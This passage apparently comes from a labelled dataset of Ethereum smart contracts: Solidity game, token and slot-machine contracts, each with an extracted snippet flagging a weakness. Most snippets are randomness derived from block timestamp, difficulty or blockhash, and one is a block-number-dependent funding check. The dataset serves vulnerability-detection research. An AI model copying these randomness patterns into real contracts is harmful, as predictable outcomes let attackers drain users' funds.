round_[_rID].plyr = _pID;\n if (round_[_rID].team != _team)\n round_[_rID].team = _team;\n _eventData_.compressedData = _eventData_.compressedData + 100;\n }\n if (_eth >= 100000000000000000){\n airDropTracker_++;\n if (airdrop() == true){\n uint256 _prize;\n if (_eth >= 10000000000000000000){\n _prize = ((airDropPot_).mul(75)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 300000000000000000000000000000000;\n }else if(_eth >= 1000000000000000000 && _eth < 10000000000000000000) {\n _prize = ((airDropPot_).mul(50)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 200000000000000000000000000000000;\n }else if(_eth >= 100000000000000000 && _eth < 1000000000000000000){\n _prize = ((airDropPot_).mul(25)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 300000000000000000000000000000000;\n }\n _eventData_.compressedData += 10000000000000000000000000000000;\n _eventData_.compressedData += _prize * 1000000000000000000000000000000000;\n airDropTracker_ = 0;\n }\n }\n _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);\n plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);\n plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);\n round_[_rID].keys = _keys.add(round_[_rID].keys);\n round_[_rID].eth = _eth.add(round_[_rID].eth);\n rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);\n _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);\n _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);\n endTx(_pID, _team, _eth, _keys, _eventData_);\n }\n }\n function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast) private view returns(uint256) {\n return( (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask) );\n }\n function calcKeysReceived(uint256 _rID, uint256 _eth) public view returns(uint256){\n uint256 _now = now;\n if (_now > round_[_rID].strt && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].eth).keysRec(_eth) );\n else\n return ( (_eth).keys() );\n }\n function iWantXKeys(uint256 _keys) public view returns(uint256) {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );\n else\n return ( (_keys).eth() );\n }\n function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff) external {\n require (msg.sender == address(PlayerBook), \"Called from PlayerBook only\");\n if (pIDxAddr_[_addr] != _pID)\n pIDxAddr_[_addr] = _pID;\n if (pIDxName_[_name] != _pID)\n pIDxName_[_name] = _pID;\n if (plyr_[_pID].addr != _addr)\n plyr_[_pID].addr = _addr;\n if (plyr_[_pID].name != _name)\n plyr_[_pID].name = _name;\n if (plyr_[_pID].laff != _laff)\n plyr_[_pID].laff = _laff;\n if (plyrNames_[_pID][_name] == false)\n plyrNames_[_pID][_name] = true;\n }\n function receivePlayerNameList(uint256 _pID, bytes32 _name) external {\n require (msg.sender == address(PlayerBook), \"Called from PlayerBook only\");\n if(plyrNames_[_pID][_name] == false)\n plyrNames_[_pID][_name] = true;\n }\n function determinePID(NTech3DDatasets.EventReturns memory _eventData_) private returns (NTech3DDatasets.EventReturns) {\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_pID == 0){\n _pID = PlayerBook.getPlayerID(msg.sender);\n bytes32 _name = PlayerBook.getPlayerName(_pID);\n uint256 _laff = PlayerBook.getPlayerLAff(_pID);\n pIDxAddr_[msg.sender] = _pID;\n plyr_[_pID].addr = msg.sender;\n if (_name != \"\"){\n pIDxName_[_name] = _pID;\n plyr_[_pID].name = _name;\n plyrNames_[_pID][_name] = true;\n }\n if (_laff != 0 && _laff != _pID)\n plyr_[_pID].laff = _laff;\n _eventData_.compressedData = _eventData_.compressedData + 1;\n }\n return _eventData_ ;\n }\n function verifyTeam(uint256 _team) private pure returns (uint256) {\n if (_team < 0 || _team > 3)\n return(2);\n else\n return(_team);\n }\n function managePlayer(uint256 _pID, NTech3DDatasets.EventReturns memory _eventData_) private returns (NTech3DDatasets.EventReturns) {\n if (plyr_[_pID].lrnd != 0)\n updateGenVault(_pID, plyr_[_pID].lrnd);\n plyr_[_pID].lrnd = rID_;\n _eventData_.compressedData = _eventData_.compressedData + 10;\n return _eventData_ ;\n }\n function endRound(NTech3DDatasets.EventReturns memory _eventData_) private returns (NTech3DDatasets.EventReturns) {\n uint256 _rID = rID_;\n uint256 _winPID = round_[_rID].plyr;\n uint256 _winTID = round_[_rID].team;\n uint256 _pot = round_[_rID].pot.add(round_[_rID].prevres);\n uint256 _win = (_pot.mul(48)) / 100;\n uint256 _com = (_pot / 50);\n uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;\n uint256 _nt = (_pot.mul(potSplit_[_winTID].nt)) / 100;\n uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_nt);\n uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);\n uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);\n if (_dust > 0){\n _gen = _gen.sub(_dust);\n _res = _res.add(_dust);\n }\n plyr_[_winPID].win = _win.add(plyr_[_winPID].win);\n if(address(communityAddr_)!=address(0x0)) {\n communityAddr_.transfer(_com);\n _com = 0 ;\n }else{\n _res = SafeMath.add(_res,_com);\n _com = 0 ;\n }\n if(_nt > 0) {\n if(address(NTFoundationAddr_) != address(0x0)) {\n NTFoundationAddr_.transfer(_nt);\n }else{\n _res = SafeMath.add(_res,_nt);\n _nt = 0 ;\n }\n }\n round_[_rID].mask = _ppt.add(round_[_rID].mask);\n _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);\n _eventData_.winnerAddr = plyr_[_winPID].addr;\n _eventData_.winnerName = plyr_[_winPID].name;\n _eventData_.amountWon = _win;\n _eventData_.genAmount = _gen;\n _eventData_.NTAmount = 0;\n _eventData_.newPot = _res;\n rID_++;\n _rID++;\n round_[_rID].strt = now;\n round_[_rID].end = now.add(rndMax_);\n round_[_rID].prevres = _res;\n return(_eventData_);\n }\n function updateGenVault(uint256 _pID, uint256 _rIDlast) private {\n uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);\n if (_earnings > 0){\n plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);\n plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);\n }\n }\n function updateTimer(uint256 _keys, uint256 _rID) private {\n uint256 _now = now;\n uint256 _newTime;\n if (_now > round_[_rID].end && round_[_rID].plyr == 0)\n _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);\n else\n _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);\n if (_newTime < (rndMax_).add(_now))\n round_[_rID].end = _newTime;\n else\n round_[_rID].end = rndMax_.add(_now);\n }\n function airdrop() private view returns(bool) {\n uint256 seed = uint256(keccak256(abi.encodePacked(\n (block.timestamp).add\n (block.difficulty).add\n ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n (block.gaslimit).add\n ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n (block.number)\n )));\n if((seed - ((seed / 1000) * 1000)) < airDropTracker_)\n return(true);\n else\n return(false);\n }\n function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, NTech3DDatasets.EventReturns memory _eventData_)\n private returns(NTech3DDatasets.EventReturns){\n uint256 _com = _eth / 50;\n uint256 _long = _eth / 100;\n if(address(otherNTech3D_)!=address(0x0)){\n otherNTech3D_.potSwap.value(_long)();\n }else{\n _com = _com.add(_long);\n }\n uint256 _aff = _eth / 10;\n if (_affID != _pID && plyr_[_affID].name != '') {\n plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);\n emit onAffiliatePayout(\n _affID,\n plyr_[_affID].addr,\n plyr_[_affID].name,\n _rID,\n _pID,\n _aff,\n now\n );\n } else {\n _com = _com.add(_aff);\n }\n uint256 _nt = (_eth.mul(fees_[_team].nt)).div(100);\n if(_com>0){\n if(address(communityAddr_)!=address(0x0)) {\n communityAddr_.transfer(_com);\n }else{\n _nt = _nt.add(_com);\n }\n }\n if(_nt > 0 ){\n uint256 amount = _nt.mul(ntOf1Ether_);\n _eventData_.NTAmount = amount.add(_eventData_.NTAmount);\n NTToken_.transfer(msg.sender,amount);\n address(NTTokenSeller_).transfer(_nt);\n }\n return (_eventData_) ;\n }\n function potSwap() external payable {\n uint256 _rID = rID_ + 1;\n round_[_rID].prevres = round_[_rID].prevres.add(msg.value);\n emit onPotSwapDeposit(\n _rID,\n msg.value\n );\n }\n function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, NTech3DDatasets.EventReturns memory _eventData_)\n private returns(NTech3DDatasets.EventReturns) {\n uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;\n uint256 _air = (_eth / 100);\n airDropPot_ = airDropPot_.add(_air);\n _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].nt)) / 100));\n uint256 _pot = _eth.sub(_gen);\n uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);\n if (_dust > 0)\n _gen = _gen.sub(_dust);\n round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);\n _eventData_.genAmount = _gen.add(_eventData_.genAmount);\n _eventData_.potAmount = _pot;\n return(_eventData_);\n }\n function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys) private returns(uint256) {\n uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);\n round_[_rID].mask = _ppt.add(round_[_rID].mask);\n uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);\n plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);\n return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));\n }\n function withdrawEarnings(uint256 _pID) private returns(uint256) {\n updateGenVault(_pID, plyr_[_pID].lrnd);\n uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);\n if (_earnings > 0){\n plyr_[_pID].win = 0;\n plyr_[_pID].gen = 0;\n plyr_[_pID].aff = 0;\n }\n return(_earnings);\n }\n function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, NTech3DDatasets.EventReturns memory _eventData_) private {\n _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);\n emit onEndTx(\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n plyr_[_pID].name,\n msg.sender,\n _eth,\n _keys,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.NTAmount,\n _eventData_.genAmount,\n _eventData_.potAmount,\n airDropPot_\n );\n }\n}",
  "extract_feature": [
    "function airdrop() private view returns(bool) {\nuint256 seed = uint256(keccak256(abi.encodePacked(\n(block.timestamp).add\n(block.difficulty).add\n((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n(block.gaslimit).add\n((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n(block.number)\n)));\nif((seed - ((seed / 1000) * 1000)) < airDropTracker_)\nreturn(true);\nelse\nreturn(false);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b24"
  },
  "filename": "1406.sol",
  "content": "pragma solidity ^0.4.12;\ncontract IMigrationContract {\n function migrate(address addr, uint256 nas) returns (bool success);\n}\ncontract SafeMath {\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract EVTCTLToken is StandardToken, SafeMath {\n string public constant name = \"EVTC\";\n string public constant symbol = \"EVTC\";\n uint256 public constant decimals = 18;\n string public version = \"1.0\";\n address public ethFundDeposit;\n address public newContractAddr;\n bool public isFunding;\n uint256 public fundingStartBlock;\n uint256 public fundingStopBlock;\n uint256 public currentSupply;\n uint256 public tokenRaised = 0;\n uint256 public tokenMigrated = 0;\n uint256 public tokenExchangeRate = 2600;\n event AllocateToken(address indexed _to, uint256 _value);\n event IssueToken(address indexed _to, uint256 _value);\n event IncreaseSupply(uint256 _value);\n event DecreaseSupply(uint256 _value);\n event Migrate(address indexed _to, uint256 _value);\n function formatDecimals(uint256 _value) internal returns (uint256 ) {\n return _value * 10 ** decimals;\n }\n function EVTCTLToken(\n address _ethFundDeposit,\n uint256 _currentSupply)\n {\n ethFundDeposit = _ethFundDeposit;\n isFunding = false;\n fundingStartBlock = 0;\n fundingStopBlock = 0;\n currentSupply = formatDecimals(_currentSupply);\n totalSupply = formatDecimals(100000000);\n balances[msg.sender] = totalSupply;\n if(currentSupply > totalSupply) throw;\n }\n modifier isOwner() { require(msg.sender == ethFundDeposit); _; }\n function setTokenExchangeRate(uint256 _tokenExchangeRate) isOwner external {\n if (_tokenExchangeRate == 0) throw;\n if (_tokenExchangeRate == tokenExchangeRate) throw;\n tokenExchangeRate = _tokenExchangeRate;\n }\n function increaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + currentSupply > totalSupply) throw;\n currentSupply = safeAdd(currentSupply, value);\n IncreaseSupply(value);\n }\n function decreaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + tokenRaised > currentSupply) throw;\n currentSupply = safeSubtract(currentSupply, value);\n DecreaseSupply(value);\n }\n function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\n if (isFunding) throw;\n if (_fundingStartBlock >= _fundingStopBlock) throw;\n if (block.number >= _fundingStartBlock) throw;\n fundingStartBlock = _fundingStartBlock;\n fundingStopBlock = _fundingStopBlock;\n isFunding = true;\n }\n function stopFunding() isOwner external {\n if (!isFunding) throw;\n isFunding = false;\n }\n function setMigrateContract(address _newContractAddr) isOwner external {\n if (_newContractAddr == newContractAddr) throw;\n newContractAddr = _newContractAddr;\n }\n function changeOwner(address _newFundDeposit) isOwner() external {\n if (_newFundDeposit == address(0x0)) throw;\n ethFundDeposit = _newFundDeposit;\n }\n function migrate() external {\n if(isFunding) throw;\n if(newContractAddr == address(0x0)) throw;\n uint256 tokens = balances[msg.sender];\n if (tokens == 0) throw;\n balances[msg.sender] = 0;\n tokenMigrated = safeAdd(tokenMigrated, tokens);\n IMigrationContract newContract = IMigrationContract(newContractAddr);\n if (!newContract.migrate(msg.sender, tokens)) throw;\n Migrate(msg.sender, tokens);\n }\n function transferETH() isOwner external {\n if (this.balance == 0) throw;\n if (!ethFundDeposit.send(this.balance)) throw;\n }\n function allocateToken (address _addr, uint256 _eth) isOwner external {\n if (_eth == 0) throw;\n if (_addr == address(0x0)) throw;\n uint256 tokens = safeMult(formatDecimals(_eth), tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[_addr] += tokens;\n AllocateToken(_addr, tokens);\n }\n function () payable {\n if (!isFunding) throw;\n if (msg.value == 0) throw;\n if (block.number < fundingStartBlock) throw;\n if (block.number > fundingStopBlock) throw;\n uint256 tokens = safeMult(msg.value, tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[msg.sender] += tokens;\n IssueToken(msg.sender, tokens);\n }\n}",
  "extract_feature": [
    "function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\nif (isFunding) throw;\nif (_fundingStartBlock >= _fundingStopBlock) throw;\nif (block.number >= _fundingStartBlock) throw;\nfundingStartBlock = _fundingStartBlock;\nfundingStopBlock = _fundingStopBlock;\nisFunding = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b25"
  },
  "filename": "1437.sol",
  "content": "pragma solidity ^0.4.20;\ncontract owned {\n address public owner;\n address public tokenContract;\n constructor() public{\n owner = msg.sender;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n modifier onlyOwnerAndtokenContract {\n require(msg.sender == owner || msg.sender == tokenContract);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n function transfertokenContract(address newOwner) onlyOwner public {\n if (newOwner != address(0)) {\n tokenContract = newOwner;\n }\n }\n}\ncontract DataContract is owned {\n struct Good {\n bytes32 preset;\n uint price;\n uint time;\n }\n mapping (bytes32 => Good) public goods;\n function setGood(bytes32 _preset, uint _price) onlyOwnerAndtokenContract external {\n goods[_preset] = Good({preset: _preset, price: _price, time: now});\n }\n function getGoodPreset(bytes32 _preset) view public returns (bytes32) {\n return goods[_preset].preset;\n }\n function getGoodPrice(bytes32 _preset) view public returns (uint) {\n return goods[_preset].price;\n }\n mapping (bytes32 => address) public decisionOf;\n function setDecision(bytes32 _preset, address _address) onlyOwnerAndtokenContract external {\n decisionOf[_preset] = _address;\n }\n function getDecision(bytes32 _preset) view public returns (address) {\n return decisionOf[_preset];\n }\n}\ncontract Token is owned {\n DataContract DC;\n constructor(address _dataContractAddr) public{\n DC = DataContract(_dataContractAddr);\n }\n uint _seed = now;\n struct Good {\n bytes32 preset;\n uint price;\n uint time;\n }\n event Decision(uint result, address finalAddress, address[] buyers, uint[] amounts);\n function _random() internal returns (uint randomNumber) {\n _seed = uint(keccak256(keccak256(block.blockhash(block.number-100))));\n return _seed ;\n }\n function _stringToBytes32(string memory _source) internal pure returns (bytes32 result) {\n bytes memory tempEmptyStringTest = bytes(_source);\n if (tempEmptyStringTest.length == 0) {\n return 0x0;\n }\n assembly {\n result := mload(add(_source, 32))\n }\n }\n function _getFinalAddress(uint[] _amounts, address[] _buyers, uint result) internal pure returns (address finalAddress) {\n uint congest = 0;\n address _finalAddress = address(0);\n for (uint j = 0; j < _amounts.length; j++) {\n congest += _amounts[j];\n if (result <= congest && _finalAddress == address(0)) {\n _finalAddress = _buyers[j];\n }\n }\n return _finalAddress;\n }\n function postTrade(bytes32 _preset, uint _price) onlyOwner public {\n require(DC.getGoodPreset(_preset) == \"\");\n DC.setGood(_preset, _price);\n }\n function decision(bytes32 _preset, string _presetSrc, address[] _buyers, uint[] _amounts) onlyOwner public payable{\n require(DC.getDecision(_preset) == address(0));\n require(sha256(_presetSrc) == DC.getGoodPreset(_preset));\n uint160 allAddress;\n for (uint i = 0; i < _buyers.length; i++) {\n allAddress += uint160(_buyers[i]);\n }\n uint random = _random();\n uint goodPrice = DC.getGoodPrice(_preset);\n uint result = uint(uint(_stringToBytes32(_presetSrc)) + allAddress + random) % goodPrice;\n address finalAddress = _getFinalAddress(_amounts, _buyers, result);\n DC.setDecision(_preset, finalAddress);\n Decision(result, finalAddress, _buyers, _amounts);\n }\n}",
  "extract_feature": [
    "function _random() internal returns (uint randomNumber) {\n_seed = uint(keccak256(keccak256(block.blockhash(block.number-100))));\nreturn _seed ;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b26"
  },
  "filename": "1472.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ZTHReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool);\n}\ncontract ZTHInterface {\n function transfer(address _to, uint _value) public returns (bool);\n function approve(address spender, uint tokens) public returns (bool);\n}\ncontract Zlots is ZTHReceivingContract {\n using SafeMath for uint;\n address private owner;\n address private bankroll;\n uint totalSpins;\n uint totalZTHWagered;\n uint contractBalance;\n bool public gameActive;\n address private ZTHTKNADDR;\n address private ZTHBANKROLL;\n ZTHInterface private ZTHTKN;\n mapping (uint => bool) validTokenBet;\n event HouseRetrievedTake(\n uint timeTaken,\n uint tokensWithdrawn\n );\n event TokensWagered(\n address _wagerer,\n uint _wagered\n );\n event LogResult(\n address _wagerer,\n uint _result,\n uint _profit,\n uint _wagered,\n uint _category,\n bool _win\n );\n event Loss(address _wagerer, uint _block);\n event ThreeMoonJackpot(address _wagerer, uint _block);\n event TwoMoonPrize(address _wagerer, uint _block);\n event ZTHJackpot(address _wagerer, uint _block);\n event ThreeZSymbols(address _wagerer, uint _block);\n event ThreeTSymbols(address _wagerer, uint _block);\n event ThreeHSymbols(address _wagerer, uint _block);\n event ThreeEtherIcons(address _wagerer, uint _block);\n event ThreeGreenPyramids(address _wagerer, uint _block);\n event ThreeGoldPyramids(address _wagerer, uint _block);\n event ThreeWhitePyramids(address _wagerer, uint _block);\n event OneMoonPrize(address _wagerer, uint _block);\n event OneOfEachPyramidPrize(address _wagerer, uint _block);\n event TwoZSymbols(address _wagerer, uint _block);\n event TwoTSymbols(address _wagerer, uint _block);\n event TwoHSymbols(address _wagerer, uint _block);\n event TwoEtherIcons(address _wagerer, uint _block);\n event TwoGreenPyramids(address _wagerer, uint _block);\n event TwoGoldPyramids(address _wagerer, uint _block);\n event TwoWhitePyramids(address _wagerer, uint _block);\n event SpinConcluded(address _wagerer, uint _block);\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n modifier onlyBankroll {\n require(msg.sender == bankroll);\n _;\n }\n modifier onlyOwnerOrBankroll {\n require(msg.sender == owner || msg.sender == bankroll);\n _;\n }\n modifier gameIsActive {\n require(gameActive == true);\n _;\n }\n constructor(address ZethrAddress, address BankrollAddress) public {\n ZTHTKNADDR = ZethrAddress;\n ZTHBANKROLL = BankrollAddress;\n owner = msg.sender;\n bankroll = ZTHBANKROLL;\n ZTHTKN = ZTHInterface(ZTHTKNADDR);\n ZTHTKN.approve(ZTHBANKROLL, 2**256 - 1);\n ZTHTKN.approve(owner, 2**256 - 1);\n validTokenBet[1e18] = true;\n validTokenBet[5e18] = true;\n validTokenBet[10e18] = true;\n validTokenBet[25e18] = true;\n validTokenBet[50e18] = true;\n gameActive = true;\n }\n function() public payable { }\n struct TKN { address sender; uint value; }\n function tokenFallback(address _from, uint _value, bytes ) public returns (bool){\n if (_from == bankroll) {\n contractBalance = contractBalance.add(_value);\n return true;\n } else {\n TKN memory _tkn;\n _tkn.sender = _from;\n _tkn.value = _value;\n _spinTokens(_tkn);\n return true;\n }\n }\n struct playerSpin {\n uint200 tokenValue;\n uint56 blockn;\n }\n mapping(address => playerSpin) public playerSpins;\n function _spinTokens(TKN _tkn) private {\n require(gameActive);\n require(_zthToken(msg.sender));\n require(validTokenBet[_tkn.value]);\n require(jackpotGuard(_tkn.value));\n require(_tkn.value < ((2 ** 200) - 1));\n require(block.number < ((2 ** 56) - 1));\n address _customerAddress = _tkn.sender;\n uint _wagered = _tkn.value;\n playerSpin memory spin = playerSpins[_tkn.sender];\n contractBalance = contractBalance.add(_wagered);\n require(block.number != spin.blockn);\n if (spin.blockn != 0) {\n _finishSpin(_tkn.sender);\n }\n spin.blockn = uint56(block.number);\n spin.tokenValue = uint200(_wagered);\n playerSpins[_tkn.sender] = spin;\n totalSpins += 1;\n totalZTHWagered += _wagered;\n emit TokensWagered(_customerAddress, _wagered);\n }\n function finishSpin() public\n gameIsActive\n returns (uint)\n {\n return _finishSpin(msg.sender);\n }\n function _finishSpin(address target)\n private returns (uint)\n {\n playerSpin memory spin = playerSpins[target];\n require(spin.tokenValue > 0);\n require(spin.blockn != block.number);\n uint profit = 0;\n uint category = 0;\n uint result;\n if (block.number - spin.blockn > 255) {\n result = 999999;\n } else {\n result = random(1000000, spin.blockn, target);\n }\n if (result > 476661) {\n emit Loss(target, spin.blockn);\n emit LogResult(target, result, profit, spin.tokenValue, category, false);\n } else {\n if (result < 1) {\n profit = SafeMath.mul(spin.tokenValue, 500);\n category = 1;\n emit ThreeMoonJackpot(target, spin.blockn);\n } else\n if (result < 298) {\n profit = SafeMath.mul(spin.tokenValue, 232);\n category = 2;\n emit TwoMoonPrize(target, spin.blockn);\n } else\n if (result < 3127) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232), 10);\n category = 3;\n emit ZTHJackpot(target, spin.blockn);\n } else\n if (result < 5956) {\n profit = SafeMath.mul(spin.tokenValue, 25);\n category = 4;\n emit ThreeZSymbols(target, spin.blockn);\n } else\n if (result < 8785) {\n profit = SafeMath.mul(spin.tokenValue, 25);\n category = 5;\n emit ThreeTSymbols(target, spin.blockn);\n } else\n if (result < 11614) {\n profit = SafeMath.mul(spin.tokenValue, 25);\n category = 6;\n emit ThreeHSymbols(target, spin.blockn);\n } else\n if (result < 14443) {\n profit = SafeMath.mul(spin.tokenValue, 50);\n category = 7;\n emit ThreeEtherIcons(target, spin.blockn);\n } else\n if (result < 17272) {\n profit = SafeMath.mul(spin.tokenValue, 40);\n category = 8;\n emit ThreeGreenPyramids(target, spin.blockn);\n } else\n if (result < 20101) {\n profit = SafeMath.mul(spin.tokenValue, 20);\n category = 9;\n emit ThreeGoldPyramids(target, spin.blockn);\n } else\n if (result < 22929) {\n profit = SafeMath.mul(spin.tokenValue, 20);\n category = 10;\n emit ThreeWhitePyramids(target, spin.blockn);\n } else\n if (result < 52332) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 125),10);\n category = 11;\n emit OneMoonPrize(target, spin.blockn);\n } else\n if (result < 120225) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 15),10);\n category = 12;\n emit OneOfEachPyramidPrize(target, spin.blockn);\n } else\n if (result < 171146) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232),100);\n category = 13;\n emit TwoZSymbols(target, spin.blockn);\n } else\n if (result < 222067) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232),100);\n category = 14;\n emit TwoTSymbols(target, spin.blockn);\n } else\n if (result < 272988) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232),100);\n category = 15;\n emit TwoHSymbols(target, spin.blockn);\n } else\n if (result < 323909) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 375),100);\n category = 16;\n emit TwoEtherIcons(target, spin.blockn);\n } else\n if (result < 374830) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 35),10);\n category = 17;\n emit TwoGreenPyramids(target, spin.blockn);\n } else\n if (result < 425751) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 225),100);\n category = 18;\n emit TwoGoldPyramids(target, spin.blockn);\n } else {\n profit = SafeMath.mul(spin.tokenValue, 2);\n category = 19;\n emit TwoWhitePyramids(target, spin.blockn);\n }\n emit LogResult(target, result, profit, spin.tokenValue, category, true);\n contractBalance = contractBalance.sub(profit);\n ZTHTKN.transfer(target, profit);\n }\n playerSpins[target] = playerSpin(uint200(0), uint56(0));\n emit SpinConcluded(target, spin.blockn);\n return result;\n }\n function jackpotGuard(uint _wager)\n private\n view\n returns (bool)\n {\n uint maxProfit = SafeMath.mul(_wager, 500);\n uint ninetyContractBalance = SafeMath.mul(SafeMath.div(contractBalance, 10), 9);\n return (maxProfit <= ninetyContractBalance);\n }\n function maxRandom(uint blockn, address entropy) private view returns (uint256 randomNumber) {\n return uint256(keccak256(\n abi.encodePacked(\n address(this),\n blockhash(blockn),\n entropy)\n ));\n }\n function random(uint256 upper, uint256 blockn, address entropy) internal view returns (uint256 randomNumber) {\n return maxRandom(blockn, entropy) % upper;\n }\n function balanceOf() public view returns (uint) {\n return contractBalance;\n }\n function addNewBetAmount(uint 